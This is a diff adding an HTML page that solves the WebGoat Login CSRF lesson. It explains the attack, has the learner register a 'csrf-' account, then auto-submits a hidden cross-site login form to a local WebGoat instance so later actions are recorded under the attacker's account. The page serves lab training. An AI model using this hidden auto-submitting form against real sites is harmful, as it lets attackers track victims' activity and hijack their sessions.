@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login CSRF Attack</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #d32f2f;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-warning { background: #fff3e0; border-color: #ff9800; color: #e65100; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        .alert-danger { background: #ffebee; border-color: #f44336; color: #b71c1c; }
+        
+        .step {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+        .step h3 {
+            margin-top: 0;
+            color: #667eea;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        button.danger {
+            background: linear-gradient(135deg, #f44336 0%, #d32f2f 100%);
+        }
+        input[type="text"] {
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            width: 300px;
+            margin: 10px 0;
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Login CSRF Attack Simulator</h1>
+        
+        <div class="alert alert-danger">
+            <strong>⚠️ IMPORTANT:</strong> This demonstrates a Login CSRF attack where the attacker 
+            tricks you into logging in as THEM, not as yourself!
+        </div>
+
+        <div class="alert alert-info">
+            <h4>📖 What is Login CSRF?</h4>
+            <p>Unlike normal CSRF where attacker uses YOUR session, in Login CSRF:</p>
+            <ol>
+                <li>Attacker creates account <code>csrf-[yourname]</code></li>
+                <li>Attacker tricks you into logging in as <strong>their account</strong></li>
+                <li>Your actions are now tracked under <strong>attacker's account</strong></li>
+                <li>Attacker logs back in and sees what you did!</li>
+            </ol>
+        </div>
+
+        <div class="step">
+            <h3>Step 1: Enter Your Original Username</h3>
+            <p>What username are you currently logged in as?</p>
+            <input type="text" id="username" placeholder="e.g., tom" />
+            <button onclick="setupAttack()">Setup Attack →</button>
+        </div>
+
+        <div id="attackSetup" style="display:none;">
+            <div class="step">
+                <h3>Step 2: Create CSRF User Account</h3>
+                <p>The attacker needs to create account: <code id="csrfUsername"></code></p>
+                <p>You need to:</p>
+                <ol>
+                    <li>Open WebGoat in a new tab</li>
+                    <li>Logout from your current account</li>
+                    <li>Click "Register new user"</li>
+                    <li>Create user: <strong id="csrfUsername2"></strong></li>
+                    <li>Use any password (remember it!)</li>
+                </ol>
+                <button onclick="confirmUserCreated()">✅ I've created the csrf- user</button>
+            </div>
+        </div>
+
+        <div id="attackExecution" style="display:none;">
+            <div class="step">
+                <h3>Step 3: Execute Login CSRF Attack</h3>
+                <p>Now the attacker will force-login you as <code id="csrfUsername3"></code></p>
+                <p>Enter the password you used for the csrf- account:</p>
+                <input type="password" id="csrfPassword" placeholder="Password for csrf- user" />
+                <br>
+                <button class="danger" onclick="executeLoginCSRF()">🚀 Execute Login CSRF Attack</button>
+            </div>
+
+            <div class="alert alert-warning">
+                <strong>What will happen:</strong>
+                <ul>
+                    <li>This page will auto-submit a login form</li>
+                    <li>You will be logged in as <code id="csrfUsername4"></code></li>
+                    <li>Go back to the original WebGoat tab</li>
+                    <li>Click the button to verify you're logged in as the CSRF user</li>
+                </ul>
+            </div>
+        </div>
+
+        <div id="result"></div>
+    </div>
+
+    <!-- Hidden login form that will be auto-submitted -->
+    <form id="loginForm" method="POST" 
+          action="http://192.168.254.112:8001/WebGoat/login"
+          target="_blank"
+          style="display:none;">
+        <input type="text" name="username" id="formUsername" />
+        <input type="password" name="password" id="formPassword" />
+    </form>
+
+    <script>
+        let originalUsername = '';
+        let csrfUsername = '';
+
+        function setupAttack() {
+            originalUsername = document.getElementById('username').value.trim();
+            
+            if (!originalUsername) {
+                alert('Please enter your username!');
+                return;
+            }
+
+            csrfUsername = 'csrf-' + originalUsername;
+            
+            // Update all references
+            document.getElementById('csrfUsername').textContent = csrfUsername;
+            document.getElementById('csrfUsername2').textContent = csrfUsername;
+            document.getElementById('csrfUsername3').textContent = csrfUsername;
+            document.getElementById('csrfUsername4').textContent = csrfUsername;
+
+            // Show next step
+            document.getElementById('attackSetup').style.display = 'block';
+            
+            console.log('Original username:', originalUsername);
+            console.log('CSRF username:', csrfUsername);
+        }
+
+        function confirmUserCreated() {
+            // Show attack execution
+            document.getElementById('attackExecution').style.display = 'block';
+            
+            // Scroll to execution section
+            document.getElementById('attackExecution').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function executeLoginCSRF() {
+            const password = document.getElementById('csrfPassword').value;
+            
+            if (!password) {
+                alert('Please enter the password for the csrf- user!');
+                return;
+            }
+
+            if (!confirm(`This will log you in as "${csrfUsername}". Continue?`)) {
+                return;
+            }
+
+            // Fill the hidden form
+            document.getElementById('formUsername').value = csrfUsername;
+            document.getElementById('formPassword').value = password;
+
+            // Show result message
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'block';
+            resultDiv.innerHTML = `
+                <div class="alert alert-success">
+                    <h3>🎯 Login CSRF Attack Executed!</h3>
+                    <p><strong>What happened:</strong></p>
+                    <ol>
+                        <li>Auto-submitted login form with attacker's credentials</li>
+                        <li>You should now be logged in as <code>${csrfUsername}</code></li>
+                        <li>A new window should have opened with WebGoat</li>
+                    </ol>
+                    <p><strong>Next steps:</strong></p>
+                    <ul>
+                        <li>Go to the NEW window that just opened</li>
+                        <li>Verify you're logged in as <code>${csrfUsername}</code> (check top right)</li>
+                        <li>Go back to your ORIGINAL WebGoat tab (with the lesson)</li>
+                        <li>Click the "Press the button" in the lesson</li>
+                        <li>The lesson should complete! 🎉</li>
+                    </ul>
+                    <p><strong>Why this works:</strong> The attacker tricked you into using THEIR session, 
+                    so when you click the button, it's tracked under the attacker's account!</p>
+                </div>
+            `;
+
+            // Submit the form after a short delay
+            setTimeout(() => {
+                console.log('Submitting login CSRF form...');
+                console.log('Username:', csrfUsername);
+                HTMLFormElement.prototype.submit.call(document.getElementById('loginForm'));
+            }, 1000);
+        }
+
+        console.log('Login CSRF Attack Page Loaded');
+        console.log('WebGoat URL: http://192.168.254.112:8001');
+    </script>
+</body>
+</html>
